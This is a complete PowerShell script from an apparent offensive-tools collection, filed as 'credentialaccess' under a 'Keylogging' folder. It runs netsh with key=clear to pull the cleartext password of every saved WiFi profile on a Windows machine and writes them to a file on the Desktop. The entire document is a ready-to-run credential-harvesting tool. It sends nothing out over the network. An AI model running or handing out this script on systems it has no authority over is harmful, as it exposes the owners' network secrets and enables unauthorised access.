###################################################################################################
#                                                                                                 |
#                   ███▄ ▄███▓ ██▓ ██▓ ██▀███   ▄▄▄      ▄▄▄       ██ ▄█▀                         |
#                  ▓██▒▀█▀ ██▒▓██▒▓██▒▓██ ▒ ██▒▒████▄   ▒████▄     ██▄█▒                          |
#                  ▓██    ▓██░▒██▒▒██▒▓██ ░▄█ ▒▒██  ▀█▄ ▒██  ▀█▄  ▓███▄░                          |
#                  ▒██    ▒██ ░██░░██░▒██▀▀█▄  ░██▄▄▄▄██░██▄▄▄▄██ ▓██ █▄                          |
#                  ▒██▒   ░██▒░██░░██░░██▓ ▒██▒ ▓█   ▓██▒▓█   ▓██▒▒██▒ █▄                         |
#                  ░ ▒░   ░  ░░▓  ░▓  ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░▒▒   ▓▒█░▒ ▒▒ ▓▒                         |
#                  ░  ░      ░ ▒ ░ ▒ ░  ░▒ ░ ▒░  ▒   ▒▒ ░ ▒   ▒▒ ░░ ░▒ ▒░                         |
#                  ░      ░    ▒ ░ ▒ ░  ░░   ░   ░   ▒    ░   ▒   ░ ░░ ░                          |
#                         ░    ░   ░     ░           ░  ░     ░  ░░  ░                            |
#                                                                                                 |
#     Title        : Export-WiFiPasswords.ps1                                                     |
#     Link         : https://github.com/Miiraak/Scripts/tree/master/PowerShell/Collection/Keylogging    |
#     Version      : 1.5                                                                          |
#     Category     : credentialaccess/wificreds                                                   |
#     Target       : Windows 10/11                                                                |
#     Description  : Extracts saved WiFi profiles and passwords (admin required).                 |
#                                                                                                 |
###################################################################################################

<#
.SYNOPSIS
    Extracts all saved WiFi profiles and their passwords (requires admin).

.DESCRIPTION
    Lists all WiFi profiles saved on the system and attempts to extract and display their cleartext passwords.
    Results are written to a file on the Desktop.

.EXAMPLE
    .\Export-WiFiPasswords.ps1
#>

# ---------------[Variables]--------------- #
$outputFile = "$env:USERPROFILE\Desktop\WiFiPasswords.txt"

# ----------------[Execution]--------------- #
if (Test-Path $outputFile) {
    Remove-Item $outputFile
}

"WiFi Passwords List" | Out-File $outputFile -Encoding UTF8
"===================" | Out-File $outputFile -Append -Encoding UTF8

# Get all WiFi profiles from the system
$profiles = netsh wlan show profiles | ForEach-Object {
    if ($_ -match ":\s(.+)$") {
        $matches[1].Trim()
    }
} | Where-Object { $_ -and $_ -ne "" }

if ($profiles.Count -eq 0) {
    Write-Host "No WiFi profiles found."
    "No WiFi profiles found." | Out-File -FilePath $outputFile -Append
    return
}

foreach ($profile in $profiles) {
    # Get profile details with clear key
    $details = netsh wlan show profile name="$profile" key=clear

    # Look for password line using generic regex (supports any language)
    $password = "Not found"
    foreach ($line in $details) {
        # Look for lines like "<...>: <password>"
        if ($line -match ".*:(.+)") {
            $key = $matches[1].Trim()
            # Filter lines containing password keywords (supports multiple languages)
            if ($line -match "key|content|clé|contenu") {
                $password = $key
                break
            }
        }
    }

    $output = @"
Profile : $profile
Password: $password
----------------------------------------
"@

    Write-Host $output
    $output | Out-File -FilePath $outputFile -Append -Encoding UTF8
}

# ------------------[End]--------------- #
Write-Host "Export complete: $outputFile"
exit 0